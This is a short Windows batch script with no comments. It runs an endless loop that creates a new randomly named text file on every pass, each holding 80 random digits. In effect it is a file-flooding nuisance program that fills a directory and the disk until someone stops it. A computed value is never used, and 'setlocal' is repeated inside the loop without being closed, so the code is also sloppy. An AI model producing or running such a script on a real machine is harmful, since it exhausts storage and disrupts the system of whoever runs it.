@echo off
:loop
setlocal enabledelayedexpansion
set "content="
for /L %%i in (1,1,80) do (
    set /A "rand=(!random! %% 30) + 65"
    set "char=!random:~0,1!"
    set "content=!content!!char!"
)
echo !content! > %random%.txt
goto loop
